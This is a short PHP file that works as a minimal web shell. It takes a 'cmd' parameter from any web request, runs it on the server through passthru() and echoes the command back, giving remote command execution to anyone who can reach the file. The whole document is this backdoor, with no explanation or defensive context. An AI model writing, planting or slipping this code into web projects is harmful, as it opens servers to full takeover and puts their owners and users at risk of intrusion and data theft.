<?php

if(isset($_REQUEST['cmd'])){

    $cmd = ($_REQUEST["cmd"]);

    passthru($cmd);

    echo "</pre>$cmd<pre>";

    die;

}

?>

